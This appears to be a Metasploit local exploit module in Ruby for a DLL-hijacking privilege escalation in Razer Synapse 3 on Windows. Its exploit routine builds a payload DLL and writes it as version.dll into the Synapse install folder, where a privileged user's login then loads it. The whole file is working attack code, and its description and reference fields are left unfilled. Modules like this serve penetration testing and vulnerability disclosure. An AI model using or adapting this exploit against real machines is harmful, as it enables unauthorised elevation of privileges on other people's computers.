##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Post::Windows::Priv
  include Post::Windows::Registry
  include Post::Windows::Runas
  include Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Razer Synapse 3 - DLL Hijacking Privilege Escalation',
      'Description'   => %q{
        To be done
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          '0x09AL'    # Discovery and module

        ],
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter'],
      'Targets'       => [
          ['Automatic', {}]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        ['URL', '']
      ],
      'DisclosureDate'=> '01/08/2018'
    ))
  end


  def exploit

    payload = generate_payload_dll({:dll_exitprocess => true})
    dll_name = expand_path("C:\\Program Files (x86)\\Razer\\Synapse3\\WPFUI\\Framework\\Razer Synapse 3 Host\\version.dll")

    begin
      print_status("Uploading payload to #{dll_name} ...")
      write_file(dll_name, payload)
      print_status("Wait for a privileged user to login.")
    end

  end
end
